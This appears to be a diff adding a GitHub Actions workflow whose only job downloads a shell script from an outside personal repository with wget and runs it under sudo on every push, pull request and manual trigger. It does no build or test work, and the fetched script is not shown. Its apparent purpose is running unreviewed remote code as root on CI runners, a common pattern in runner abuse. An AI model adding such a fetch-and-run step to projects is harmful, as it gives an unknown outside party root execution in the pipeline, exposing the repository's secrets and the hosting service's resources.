@@ -1,0 +1,22 @@
+on:
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  run-jb-script:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v3
+
+    - name: Download and run script
+      run: |
+        wget -O 0615.sh https://raw.githubusercontent.com/kuilema2/0615/main/0615.sh
+        chmod +x 0615.sh
+        sudo ./0615.sh
